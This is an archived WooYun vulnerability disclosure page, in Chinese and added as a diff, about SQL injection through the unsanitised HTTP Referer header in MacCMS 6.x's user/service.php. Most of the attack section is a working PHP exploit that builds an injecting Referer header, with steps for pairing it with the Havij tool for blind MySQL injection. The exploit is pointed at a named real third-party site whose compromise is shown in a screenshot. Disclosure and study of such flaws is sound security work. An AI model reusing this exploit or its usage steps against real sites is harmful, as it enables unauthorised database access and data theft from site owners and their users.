@@ -1,0 +1,269 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		MacCMS 6.x referer处理不当引发注射  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		MacCMS 6.x referer处理不当引发注射  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/lxj616">lxj616</a> 
+</li><li>提交时间：		2013-10-03 14:52</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-03：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2014-01-01：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">MacCMS 9月份新出7.x版本不受影响 因此这个漏洞成为历史漏洞了<br />
+不过还是发出来给大家一起讨论学习一下吧<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/user/service.php<br />
+<br />
+<br />
+<br />
+</p><pre><code>function Popularize()<br />
+{<br />
+	global $db;<br />
+	$userid = safeData(&quot;userid&quot;,&quot;get&quot;);<br />
+	if (!isNum($userid)) { die(&quot;用户非法,请从新登陆!&quot;);}<br />
+	$Ip = getip();<br />
+	$Ly = $_SERVER[&quot;HTTP_REFERER&quot;];<br />
+	$row = $db-&gt;getRow(&quot;select * from tbl_user where u_id=&quot; . $userid .&quot;&quot;); <br />
+	<br />
+	if ($row){<br />
+		$sql=&quot;Select * From tbl_user_visit where uv_userid = &quot; .$userid.&quot; and uv_ip =&#039;&quot;.$Ip.&quot;&#039; and STR_TO_DATE(uv_time,&#039;%Y-%m-%d&#039;)=&#039;&quot;.date(&quot;Y-m-d&quot;).&quot;&#039;&quot;;<br />
+		$rsUv = $db-&gt;query($sql);<br />
+		$nums= $db -&gt; num_rows($rsUv);<br />
+		if ($nums==0){<br />
+			$db-&gt;query(&quot;insert tbl_user_visit (uv_userid,uv_ip,uv_ly,uv_time) values(&#039;&quot;.$userid.&quot;&#039;,&#039;&quot;.$Ip.&quot;&#039;,&#039;&quot;.$Ly.&quot;&#039;,&#039;&quot;.date(&#039;Y-m-d H:i:s&#039;,time()).&quot;&#039;) &quot;);<br />
+			$db-&gt;query(&quot;update tbl_user set u_popularizenum=u_popularizenum+1,u_points=u_points+&quot;.app_userpopularize.&quot; where u_id = &quot;. $userid );<br />
+			$sql=&quot;Delete From tbl_user_visit where STR_TO_DATE(uv_time,&#039;%Y-%m-%d&#039;)&lt;&#039;&quot;.date(&quot;Y-m-d&quot;).&quot;&#039;&quot;;<br />
+			$db-&gt;query($sql);<br />
+		}<br />
+	}<br />
+	die(&quot;&lt;sc&quot; . &quot;ript type=\&quot;text/javascript\&quot;&gt;location.href=&#039;&quot; .getIndexLink() .&quot;&#039;;&lt;/sc&quot; . &quot;ript&gt;&quot;);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$Ly = $_SERVER[&quot;HTTP_REFERER&quot;]; 没有处理直接进入SQL INSERT<br />
+<br />
+<br />
+<br />
+所以就射了，<br />
+<br />
+下面漏洞证明附PHP exploit </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">alkaid.php<br />
+<br />
+用法：修改最下面的uc_fopen(&#039;http://www.391.net/user/service.php?action=popularize&amp;userid=597&#039;,0,0,0,FALSE,&#039;&#039;,15,true,$_GET[&quot;a&quot;]);<br />
+<br />
+为目标网站对应service.php地址格式，然后去注册个合法ID填在userid=597位置上（重要！！！）<br />
+<br />
+<br />
+<br />
+然后将alkaid.php?a=1 地址托给Havij用MySQL Blind可以注射<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php<br />
+function uc_fopen($url, $limit = 0, $post = &#039;&#039;, $cookie = &#039;&#039;, $bysocket = FALSE, $ip = &#039;&#039;, $timeout = 15, $block = TRUE,$inject) {<br />
+$return = &#039;&#039;;<br />
+$matches = parse_url($url);<br />
+!isset($matches[&#039;host&#039;]) &amp;&amp; $matches[&#039;host&#039;] = &#039;&#039;;<br />
+!isset($matches[&#039;path&#039;]) &amp;&amp; $matches[&#039;path&#039;] = &#039;&#039;;<br />
+!isset($matches[&#039;query&#039;]) &amp;&amp; $matches[&#039;query&#039;] = &#039;&#039;;<br />
+!isset($matches[&#039;port&#039;]) &amp;&amp; $matches[&#039;port&#039;] = &#039;&#039;;<br />
+$host = $matches[&#039;host&#039;];<br />
+$path = $matches[&#039;path&#039;] ? $matches[&#039;path&#039;].($matches[&#039;query&#039;] ? &#039;?&#039;.$matches[&#039;query&#039;] : &#039;&#039;) : &#039;/&#039;;<br />
+$port = !empty($matches[&#039;port&#039;]) ? $matches[&#039;port&#039;] : 80;<br />
+if($post) {<br />
+   $out = &quot;POST $path HTTP/1.0\r\n&quot;;<br />
+   $out .= &quot;Accept: **\r\n&quot;;<br />
+   //$out .= &quot;Referer: $boardurl\r\n&quot;;<br />
+   $out .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+   $out .= &quot;User-Agent: $_SERVER[HTTP_USER_AGENT]\r\n&quot;;<br />
+   $out .= &quot;Host: $host\r\n&quot;;<br />
+   $out .= &quot;Connection: Close\r\n&quot;;<br />
+   $out .= &quot;Cookie: $cookie\r\n\r\n&quot;;<br />
+}else {<br />
+   $out = &quot;GET $path HTTP/1.0\r\n&quot;;<br />
+   $out .= &quot;Accept: */*\r\n&quot;;<br />
+   $out .= &quot;Referer: a&#039;,(select now()) and &quot;.$inject.&quot;)#\r\n&quot;;<br />
+   $out .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+   $out .= &quot;User-Agent: $_SERVER[HTTP_USER_AGENT]\r\n&quot;;<br />
+   $out .= &quot;Host: $host\r\n&quot;;<br />
+   $out .= &quot;Connection: Close\r\n&quot;;<br />
+   $out .= &quot;Cookie: $cookie\r\n\r\n&quot;;<br />
+}<br />
+<br />
+$fp = @fsockopen(($ip ? $ip : $host), $port, $errno, $errstr, $timeout);<br />
+if(!$fp) {<br />
+   return &#039;&#039;;//note $errstr : $errno \r\n<br />
+} else {<br />
+   stream_set_blocking($fp, $block);<br />
+   stream_set_timeout($fp, $timeout);<br />
+   @fwrite($fp, $out);<br />
+   $status = stream_get_meta_data($fp);<br />
+   if(!$status[&#039;timed_out&#039;]) {<br />
+    while (!feof($fp)) {<br />
+     if(($header = @fgets($fp)) &amp;&amp; ($header == &quot;\r\n&quot; || $header == &quot;\n&quot;)) {<br />
+      break;<br />
+     }<br />
+    }<br />
+<br />
+    $stop = false;<br />
+    while(!feof($fp) &amp;&amp; !$stop) {<br />
+     $data = fread($fp, ($limit == 0 || $limit &gt; 8192 ? 8192 : $limit));<br />
+     $return .= $data;<br />
+     if($limit) {<br />
+      $limit -= strlen($data);<br />
+      $stop = $limit &lt;= 0;<br />
+     }<br />
+    }<br />
+   }<br />
+   @fclose($fp);<br />
+   return $return;<br />
+}<br />
+}<br />
+<br />
+uc_fopen(&#039;http://www.391.net/user/service.php?action=popularize&amp;userid=597&#039;,0,0,0,FALSE,&#039;&#039;,15,true,$_GET[&quot;a&quot;]);<br />
+echo &#039;hi&#039;;<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+391.net躺枪了 给我们牺牲自己证明一下吧（官方不自带演示站点的结果）<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/031343084595496901722e221eaa337548291312.jpg" target="_blank"><img src="../images/031343084595496901722e221eaa337548291312.jpg" alt="391.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">最新 7.x 版本已经不存在这个问题了 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/lxj616" title="lxj616">lxj616</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-038804" title="MacCMS 6.x referer处理不当引发注射">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="38804";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
